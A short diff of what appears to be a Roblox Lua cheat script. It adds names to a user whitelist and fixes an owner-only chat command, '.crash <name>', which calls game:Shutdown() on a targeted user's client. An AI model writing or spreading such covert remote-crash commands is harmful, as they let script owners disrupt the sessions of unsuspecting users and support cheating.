@@ -37,7 +37,9 @@ _G.whitelist = {
 	["borys2500"] = true,
 	["OFFICIAL_BRUTELDLX"] = true,
 	["IIllllIIIlIIllIlll"] = true,
-	["Sprinkolicious"] = true
+	["Sprinkolicious"] = true,
+	["SynapseScripter99"] = true,
+	["Prolimo652"] = true
 }
 
 if not _G.whitelist[game.Players.LocalPlayer.Name] then
@@ -7755,7 +7757,7 @@ function ownercmds(p)
 	p.Chatted:connect(function(msg)
 		if msg:sub(1,7) == ".crash " then
 			v = FindTarget(msg:sub(8))
-			if v == lp.Name then
+			if v.Name == game.Players.LocalPlayer.Name then
 				game:Shutdown()
 			end
 		end
